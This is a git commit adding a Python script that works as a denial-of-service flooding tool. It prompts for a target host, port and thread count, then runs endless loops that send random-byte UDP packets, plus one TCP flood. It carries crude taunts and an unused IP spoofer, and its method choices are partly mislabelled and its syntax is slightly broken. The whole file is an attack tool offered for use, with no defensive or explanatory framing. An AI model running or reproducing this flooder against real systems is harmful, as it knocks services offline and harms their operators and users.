77664bdcb77d22a82f18110f10d89b4ca1e4d9ba
XINZU4546 <91364565+XINZU4546@users.noreply.github.com>
2022-07-17 07:52:08 +0700

    Add files via upload

---
+++ XinZu1.py
@@ -0,0 +1,186 @@
+import random
+import socket
+import threading
+import os
+import sys
+import time
+
+from os import system
+#pass
+password ="XinZz"
+def clear():
+	os.system('cls'if os name=='nt' else 'clear')
+
+print(" Welcome To My Tools ") 
+print(" No Abuse My Tools ") 
+print(" Tools By : XinZu ") 
+
+ip = str(input(" Host/Ip Target :")) 
+port = int(input(" Port Server : ")) 
+choice = str(input(" Methods | UDP-TCP-GET-OVH ")) 
+times = int(input(" Times : ")) 
+threads = int(input(" Threads : ")) 
+
+os.system("clear") 
+def run():
+	data = random._urandom(577)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" XinZu Attack Your Server ")
+		except:
+			print("[!] ERROR SERVER TIME OUT")
+			
+def run2():
+	data = random._urandom(818)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" XinZu Attack Your Server ")
+		except:
+			print("[!] ERROR SERVER TIME OUT")
+			
+def run3():
+	data = random._urandom(818)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" XinZu Attack Your Server ")
+		except:
+			print("[!] ERROR SERVER TIME OUT")
+			
+def run4():
+	data = random._urandom(17)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" XinZu Attack Your Server")
+		except:
+			print("[!] ERROR SERVER TIME OUT")
+			
+def run5():
+	data = random._urandom(1872637)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" XinZu Attack Your Server ")
+		except:
+			print("[!] ERROR SERVER TIME OUT")
+
+def run6():
+	data = random._urandom(146734)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" XinZu Attack Your Server. ")
+		except:
+			print("[!] ERROR SERVER TIME OUT")
+
+def run7():
+    data = random._urandom(818)
+    i = random.choice(("[•]","[•]","[•]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"XinZu Attack Your Server ")
+        except:
+            s.close()
+            print("DOWN KONTOL!!!")
+
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
+
+for y in range(threads):
+	if choice == 'UDP':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+	if choice == 'udp':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+	if choice == 'TCP':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+	if choice == 'tcp':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+	if choice == 'GET':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+	if choice == 'get':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+	if choice == 'OVH':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+	if choice == 'ovh':
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+else:
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+		th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+		th = threading.Thread(target = run6)
+		th.start()
+		th = threading.Thread(target = run7)
